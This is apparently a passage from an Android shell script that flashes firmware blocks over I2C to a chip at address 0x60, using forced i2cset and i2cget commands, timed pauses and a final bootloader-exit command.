/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x6c 0x98 0x53 0x72 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x99 0x9 0x8 0x53 0x73 0x51 0x72 0x12 0x8e 0x51 0x73 0x1a 0x8d 0xd0 0x4 0x2e i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xa3 0x1 0x62 0xd0 0x0 0x51 0x8e 0x8 0x51 0x8d 0x53 0x87 0x18 0x53 0x88 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xd0 0x0 0x47 0x43 0x1 0xa0 0x48 0x10 0x50 0x0 0x7c 0xd 0x72 0x20 0x39 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xa0 0x20 0x62 0xd0 0x0 0x51 0x84 0x11 0x90 0x51 0x83 0x19 0x4 0xc8 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x6d 0x1 0xc0 0xb 0x50 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x98 0x12 0x84 0x50 0x8 0x1a 0x83 0xd0 0x9 0x62 0xd0 0x0 0x2e 0xa2 0x1 0x80 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x7 0x62 0xd0 0x0 0x26 0xa2 0xfe 0x62 0xd0 0x0 0x3c 0xa7 0x0 0xa0 0x29 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x84 0x11 0x90 0x51 0x83 0x19 0x1 0xd0 0x1f 0x26 0xa2 0xfe 0x80 0x1a 0x62 0xd0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x0 0x2e 0xa2 0x1 0x80 0x12 0x62 0xd0 0x0 0x3c 0xa5 0x0 0xd3 0x67 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x6e 0xa0 0xa 0x55 0xa5 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x0 0x55 0xa2 0x0 0x55 0xa7 0x0 0x62 0xd0 0x0 0x51 0xa2 0x22 0x7e 0x53 0x5d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x47 0xa4 0x3 0xb0 0x5 0x51 0x5d 0x53 0x3e 0x62 0xd0 0x0 0x51 0xa1 0x3a 0x5d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xa0 0xd 0x47 0xa4 0x1 0xa0 0x6 0x26 0xa4 0xfe 0x80 0x3 0x9d 0x8f 0x62 0xd0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x0 0x47 0xa4 0x2 0xa0 0x30 0x47 0xa4 0x1 0xb0 0x7 0x2e 0x1f 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x6f 0x3e 0x1 0x55 0x47 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x8 0x62 0xd0 0x0 0x51 0x9a 0x1 0x98 0x53 0x72 0x51 0x99 0x9 0x8 0x53 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x51 0x8e 0x12 0x72 0x51 0x8d 0x1a 0x73 0xd0 0xc 0x26 0xa4 0xfd 0x55 0xa3 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x26 0x3e 0xfe 0x9d 0x58 0x9d 0x75 0x62 0xd0 0x0 0x3c 0x45 0x2 0xb0 0x4 0x43 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xff 0x8 0x62 0xd0 0x0 0x51 0x42 0x53 0x72 0x50 0x0 0x8 0x86 0xcf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x70 0x51 0x72 0x8 0x9d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x6 0x38 0xfe 0x10 0x7c 0xc 0x8e 0x20 0x62 0xd0 0x0 0x47 0x48 0x80 0xa0 0x85 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x51 0x48 0x21 0xf 0x54 0x1 0x92 0x13 0x40 0x51 0x72 0x1 0x81 0x53 0x70 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x73 0x9 0x0 0x92 0x21 0x40 0x6 0x72 0x8d 0x91 0x27 0x40 0x12 0x70 0x54 0x4 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x51 0x73 0x1a 0x71 0x54 0x3 0x52 0x3 0x53 0x49 0x52 0x4 0xdf 0x82 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x71 0x53 0x4a 0x52 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x53 0x72 0x55 0x73 0x0 0x65 0x72 0x6b 0x73 0x6 0x72 0x8d 0xe 0x73 0x0 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x73 0x60 0xd4 0x3e 0x72 0x54 0x3 0x3e 0x72 0x54 0x4 0x52 0x3 0x53 0x4b 0x52 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x4 0x53 0x4c 0x52 0x1 0x91 0x38 0x40 0x54 0x3 0x3e 0x72 0x54 0x4 0x91 0xbb i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x40 0x6 0x72 0x81 0x90 0xdc 0x40 0x51 0x73 0x53 0x4d 0x52 0x49 0x57 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x72 0x1 0x91 0x20 0x40 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x3e 0x72 0x53 0x4e 0x51 0x5e 0x53 0x4f 0x51 0x5f 0x53 0x50 0x51 0x3e 0x53 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x51 0xa2 0x53 0x52 0x10 0x7c 0xc 0x81 0x20 0x8d 0x54 0x38 0xfb 0x20 0x8f 0xff i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x10 0x4f 0x38 0x2 0x5d 0xd0 0x8 0x62 0xd0 0x0 0x50 0x0 0x54 0x0 0x53 0x68 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x53 0x67 0x53 0x66 0x56 0x1 0x20 0x48 0xf8 0x1 0xa0 0x11 0xe8 0x96 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x73 0x52 0xfc 0x4 0x66 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x52 0xfb 0xc 0x67 0x52 0xfa 0xc 0x68 0x52 0xf9 0xd 0x0 0x6f 0x0 0x6e 0x68 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x6e 0x67 0x6e 0x66 0x6f 0xf5 0x6f 0xf6 0x6f 0xf7 0x6f 0xf8 0x7b 0x1 0xbf 0xd8 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x18 0x60 0xd0 0x38 0xfe 0x20 0x70 0x3f 0x71 0xc0 0x7f 0x30 0x54 0x0 0x52 0xfc i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x53 0x72 0x55 0x73 0x0 0x65 0x72 0x6b 0x73 0x6 0x72 0x8d 0x3d 0x41 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x74 0xe 0x73 0x0 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x73 0x60 0xd4 0x3e 0x72 0x53 0x73 0x3e 0x72 0x53 0x70 0x51 0x73 0x53 0x71 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x70 0x5 0x3 0x51 0x71 0xd 0x2 0x50 0x0 0xf 0x1 0x0 0xf 0x0 0x0 0x52 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x0 0x53 0x73 0x52 0x1 0x53 0x72 0x52 0x2 0x53 0x71 0x52 0x3 0x53 0x70 0x50 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x6 0x70 0xfb 0x62 0xd0 0x0 0x6e 0x73 0x6e 0x72 0x6e 0x71 0xe6 0x94 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x75 0x6e 0x70 0x78 0xbf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0xf1 0x51 0x73 0x54 0x0 0x51 0x72 0x54 0x1 0x51 0x71 0x54 0x2 0x51 0x70 0x54 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x3 0x7f 0xe 0x73 0x0 0x51 0x73 0x60 0xd4 0x3e 0x72 0x53 0x73 0x3e 0x72 0x7f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x52 0x0 0x53 0x73 0x52 0x1 0x53 0x72 0x52 0x2 0x53 0x71 0x52 0x3 0x53 0x70 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x50 0x6 0x70 0xfb 0x62 0xd0 0x0 0x6e 0x73 0x6e 0x72 0x6e 0x85 0xd3 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x76 0x71 0x6e 0x70 0x78 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0xbf 0xf1 0x51 0x73 0x54 0x0 0x51 0x72 0x54 0x1 0x51 0x71 0x54 0x2 0x51 0x70 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x54 0x3 0x7f 0x52 0xfc 0x53 0x72 0x55 0x73 0x0 0x65 0x72 0x6b 0x73 0x7f 0x53 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x72 0x55 0x73 0x0 0x65 0x72 0x6b 0x73 0x6 0x72 0x81 0xe 0x73 0x0 0x51 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x60 0xd4 0x3e 0x72 0x7f 0x62 0xd0 0x0 0x52 0xfc 0x53 0x72 0x8d 0xe4 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x77 0x55 0x73 0x0 0x7f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x62 0xd0 0x0 0x52 0x3 0x53 0x72 0x52 0x2 0x53 0x73 0x52 0xfc 0x53 0x70 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x71 0x0 0x65 0x70 0x6b 0x71 0x6 0x70 0x85 0xe 0x71 0x0 0x51 0x71 0x60 0xd5 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x51 0x73 0x3f 0x70 0x51 0x72 0x3f 0x70 0x7f 0x52 0xfc 0x53 0x70 0x55 0x71 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x65 0x70 0x6b 0x71 0x7f 0x53 0x72 0x52 0xfb 0x12 0x72 0x53 0xfa 0xbf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x78 0x72 0x52 0xfa 0x1a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x73 0x53 0x73 0x51 0x72 0x54 0x5 0x51 0x73 0x54 0x4 0x7f 0xe 0x71 0x0 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x71 0x60 0xd5 0x51 0x73 0x3f 0x70 0x51 0x72 0x3f 0x70 0x7f 0x62 0xd0 0x0 0x52 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x1 0x53 0x72 0x55 0x73 0x0 0x65 0x72 0x6b 0x73 0x7f 0x52 0x1 0x53 0x72 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x73 0x0 0x65 0x72 0x6b 0x73 0x7f 0x6 0x72 0x9e 0xe 0x73 0x93 0xf2 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x79 0x0 0x51 0x73 0x60 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0xd5 0x50 0x1 0x3f 0x72 0x7f 0x60 0xd4 0x3e 0x70 0x53 0x71 0x3e 0x70 0x53 0x70 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x7f 0x65 0x70 0x6b 0x71 0x51 0x70 0x2 0x72 0x53 0x72 0x51 0x71 0xa 0x73 0x7f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x65 0x72 0x6b 0x73 0x65 0x72 0x6b 0x73 0x6 0x72 0x74 0xe 0x73 0x0 0x52 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x53 0x70 0x55 0x71 0x0 0x7f 0x13 0x5 0x52 0x4 0x31 0x80 0xc9 0x5f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x7a 0x53 0x68 0x50 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x31 0x80 0x1a 0x68 0x7f 0x51 0x9d 0x62 0xd0 0x0 0x53 0x72 0x55 0x73 0x0 0x7f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x53 0x72 0x52 0x5 0x12 0x72 0x52 0x4 0x1a 0x73 0x7f 0x6 0x72 0x81 0xe 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x0 0x51 0x73 0x60 0xd5 0x7f 0x0 0x3e 0x0 0x28 0x0 0x74 0x0 0x8 0x0 0x85 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x0 0x8 0x0 0x8f 0x2 0x0 0x32 0x0 0x91 0x0 0x6 0x0 0xa6 0x1a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x7b 0x99 0x0 0x4 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x9d 0x1 0x4b 0x0 0x9e 0x0 0xb 0xff 0x0 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0xbe 0x4b i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x7c 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x40 0x30 0x10 0xf0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x7d 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x20 0xf0 0xb1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x7e 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x20 0x20 0xe0 0x92 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x7f 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x0 0xd3 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x3b 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 i
/data/local/tmp/i2cget -f -y 1 0x5c 0x0
/data/local/tmp/i2cget -f -y 1 0x5c 0x8
/data/local/tmp/i2cget -f -y 1 0x5c 0x6
/data/local/tmp/i2cget -f -y 1 0x5c 0x0
!
